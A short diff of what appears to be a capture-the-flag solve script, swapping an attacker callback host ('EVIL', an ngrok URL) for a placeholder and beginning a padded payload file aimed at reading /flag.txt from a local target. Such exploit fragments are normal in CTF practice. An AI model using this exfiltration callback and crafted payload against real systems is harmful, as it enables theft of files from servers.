@@ -583,7 +583,7 @@ import requests
 
 # URL = "https://45e2d4ee-d444-4631-ac4c-c1d2e59daebc.x3c.tf:31337/"
 URL = "http://localhost:8080/"
-EVIL = "https://tchenio.ngrok.io/"
+EVIL = "https://xxx.ngrok.app/"
 
 file = b"""\\{"sections": [{"type": "link", "tag": "i", "value":  "/flag.txt", "x": "a"""
 file += (b"x" * (2048 - len(file))) + b'PCD_IPI"}]}'
